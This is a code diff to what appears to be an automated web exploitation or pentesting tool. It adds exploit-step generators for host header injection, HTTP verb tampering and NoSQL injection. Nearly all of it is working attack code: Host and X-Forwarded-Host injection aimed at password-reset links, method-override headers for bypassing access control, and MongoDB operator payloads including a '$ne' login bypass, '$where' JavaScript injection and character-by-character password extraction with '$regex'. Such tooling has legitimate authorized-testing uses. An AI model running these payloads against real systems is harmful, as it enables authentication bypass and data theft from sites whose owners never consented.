@@ -4827,6 +4827,225 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
                 "note": f"Testing {name} bypass → attacker host",
             })
 
+    elif etype == "host_header_injection":
+        # Host header injection — reflect attacker-controlled Host into
+        # Location or into rendered absolute URLs. allow_redirects=False
+        # so we read the Location directly.
+        _hh_marker = f"hh{secrets.token_hex(4)}.example.test"
+        _hh_target_host = (base_url.split("//", 1)[1].split("/", 1)[0]
+                           if "//" in base_url else "")
+
+        def _hh_check(r: ExploitResult):
+            loc = (r.response_headers.get("Location", "") or
+                   r.response_headers.get("location", ""))
+            if loc:
+                loc_host = urlparse(loc).netloc.lower()
+                if loc_host == _hh_marker.lower():
+                    r.success = True
+                    r.confidence = 0.95
+                    r.evidence = f"Location reflected marker host: {loc[:100]}"
+                    r.false_positive_risk = "very_low"
+                    return
+            body = r.response_body or ""
+            if _hh_marker in body:
+                if (f"//{_hh_marker}" in body or
+                        f"://{_hh_marker}" in body or
+                        _re.search(
+                            r"""(?:href|src|action)\s*=\s*['"][^'"]*"""
+                            + _re.escape(_hh_marker)
+                            + r"""[^'"]*['"]""", body, _re.I)):
+                    r.success = True
+                    r.confidence = 0.85
+                    r.evidence = "Marker rendered as absolute URL in body"
+                    r.false_positive_risk = "low"
+                    return
+                r.confidence = 0.4
+                r.evidence = "Marker appeared in body but not URL-ish"
+            elif r.status_code:
+                r.evidence = f"HTTP {r.status_code}, no reflection"
+                r.confidence = 0.1
+
+        def _hh_request(header_name: str) -> dict:
+            return _get(target, extra_headers={header_name: _hh_marker},
+                        allow_redirects=False)
+
+        steps = [
+            {"title": "Baseline (no injection)",
+             "request": _get(target, allow_redirects=False),
+             "validate": lambda r: setattr(
+                 r, 'evidence',
+                 f"Baseline HTTP {r.status_code}, "
+                 f"Location: {r.response_headers.get('Location', '-')[:80]}"),
+             "note": "Capture server's normal Location so comparisons mean something"},
+            {"title": "Host header reflection",
+             "request": _hh_request("Host"),
+             "validate": _hh_check,
+             "warning": "Some WAFs / load balancers reject unexpected Host",
+             "note": "Most password-reset link injection flows key off Host"},
+            {"title": "X-Forwarded-Host reflection",
+             "request": _hh_request("X-Forwarded-Host"),
+             "validate": _hh_check,
+             "note": "Framework reads X-Forwarded-Host when behind a proxy"},
+            {"title": "X-Forwarded-Server reflection",
+             "request": _hh_request("X-Forwarded-Server"),
+             "validate": _hh_check,
+             "note": "Apache/nginx sometimes honor this"},
+            {"title": "X-Host reflection",
+             "request": _hh_request("X-Host"),
+             "validate": _hh_check,
+             "note": "Nonstandard but used by some middlewares"},
+            {"title": "Double-Host (duplicate header) trick",
+             "request": _get(
+                 target,
+                 extra_headers={"Host": f"{_hh_target_host}",
+                                "X-Forwarded-Host": _hh_marker},
+                 allow_redirects=False,
+             ),
+             "validate": _hh_check,
+             "note": "Legit Host + malicious X-Forwarded-Host often bypasses "
+                     "validators that only check Host"},
+            {"title": "Password-reset-style probe",
+             "request": _get(
+                 urljoin(base_url, "/password/reset"),
+                 extra_headers={"Host": _hh_marker},
+                 allow_redirects=False,
+             ),
+             "validate": _hh_check,
+             "warning": "May trigger a password-reset email if POST is not required",
+             "note": "Target common password-reset routes that build links from Host"},
+        ]
+
+    elif etype == "http_verb_tampering":
+        # Verb-tampering: retry the walled path with alternate verbs +
+        # method-override header. The finding already told us which
+        # path is walled, so we can go straight at it.
+        _vt_path = ei.get("path", "/admin")
+        _vt_url = base_url.rstrip("/") + _vt_path
+
+        def _vt_check(r: ExploitResult):
+            if not r.error and 200 <= r.status_code < 300:
+                r.success = True
+                r.confidence = 0.9
+                r.evidence = f"HTTP {r.status_code} on alt verb → bypass"
+                r.false_positive_risk = "low"
+            elif r.status_code in (401, 403):
+                r.evidence = f"HTTP {r.status_code} — still walled"
+                r.confidence = 0.1
+            elif r.status_code == 405:
+                r.evidence = "405 Method Not Allowed (auth rule fine)"
+                r.confidence = 0.05
+            elif r.status_code:
+                r.evidence = f"HTTP {r.status_code}"
+
+        steps = [
+            {"title": f"Baseline GET {_vt_path} (should be 401/403)",
+             "request": _get(_vt_url, allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Confirms the wall is still in place"},
+        ]
+        for verb in ("HEAD", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"):
+            steps.append({
+                "title": f"Verb tamper: {verb} {_vt_path}",
+                "request": {"method": verb, "url": _vt_url,
+                            "allow_redirects": False},
+                "validate": _vt_check,
+                "note": f"{verb} slips past GET-only auth rule in some WAFs",
+            })
+        steps.extend([
+            {"title": "X-HTTP-Method-Override: GET",
+             "request": _get(_vt_url,
+                             extra_headers={"X-HTTP-Method-Override": "GET"},
+                             allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Override header read after WAF rule fires"},
+            {"title": "X-HTTP-Method: GET",
+             "request": _get(_vt_url,
+                             extra_headers={"X-HTTP-Method": "GET"},
+                             allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Same as above — alternate header name"},
+            {"title": "X-Method-Override: GET",
+             "request": _get(_vt_url,
+                             extra_headers={"X-Method-Override": "GET"},
+                             allow_redirects=False),
+             "validate": _vt_check,
+             "note": "Another common override header"},
+        ])
+
+    elif etype == "nosql_injection":
+        # NoSQL walkthrough — try [$ne], [$gt], [$regex], and the
+        # JSON-body shape that MongoDB drivers accept.
+        _nq_param = param or "id"
+        _nq_base = target.split("?")[0]
+
+        def _nq_check(r: ExploitResult):
+            body = r.response_body or ""
+            for ind in (
+                _re.compile(r"MongoError|MongoServerError", _re.I),
+                _re.compile(r"E11000 duplicate key", _re.I),
+                _re.compile(r"CastError:.*ObjectId", _re.I),
+                _re.compile(r"\$where.*not allowed", _re.I),
+                _re.compile(r"unknown top level operator", _re.I),
+            ):
+                if ind.search(body[:6000]):
+                    r.success = True
+                    r.confidence = 0.9
+                    r.evidence = f"NoSQL error: {ind.pattern[:40]}"
+                    r.false_positive_risk = "low"
+                    return
+            if r.status_code == 200 and len(body) > 200:
+                r.confidence = 0.5
+                r.evidence = (f"HTTP 200 with {len(body)}-byte body — "
+                              f"check response manually for enumerated data")
+                r.false_positive_risk = "medium"
+
+        steps = [
+            {"title": "Baseline (bogus scalar)",
+             "request": _get(_nq_base,
+                             extra_params={_nq_param: f"xx{secrets.token_hex(3)}"}),
+             "validate": _nq_check,
+             "note": "Capture baseline length / status for boolean compare"},
+            {"title": "$ne operator (always-true)",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$ne]": "0"}),
+             "validate": _nq_check,
+             "note": "Coerces every document to match. More data in "
+                     "response = confirmed."},
+            {"title": "$gt operator (always-true)",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$gt]": ""}),
+             "validate": _nq_check,
+             "note": "Same idea as $ne"},
+            {"title": "$regex operator (pattern matching)",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$regex]": ".*"}),
+             "validate": _nq_check,
+             "note": "Data extraction primitive — returns any document"},
+            {"title": "$where JS injection",
+             "request": _get(_nq_base,
+                             extra_params={f"{_nq_param}[$where]": "1==1"}),
+             "validate": _nq_check,
+             "warning": "MongoDB $where runs JavaScript — full RCE class",
+             "risk": "HIGH"},
+            {"title": "JSON body auth-bypass shape",
+             "request": _post(
+                 _nq_base,
+                 {"username": "admin", "password": '{"$ne": null}'},
+             ),
+             "validate": _nq_check,
+             "warning": "Common MongoDB login bypass — no password check",
+             "note": "{'$ne': null} matches any document"},
+            {"title": "Blind boolean: password $regex",
+             "request": _post(
+                 _nq_base,
+                 {"username": "admin",
+                  "password": '{"$regex": "^a"}'},
+             ),
+             "validate": _nq_check,
+             "note": "Extracts the password one character at a time "
+                     "by iterating ^a, ^b, ^aa, ^ab, ..."},
+        ]
+
     else:
         steps = [
             {"title": f"Manual verification for {etype}",
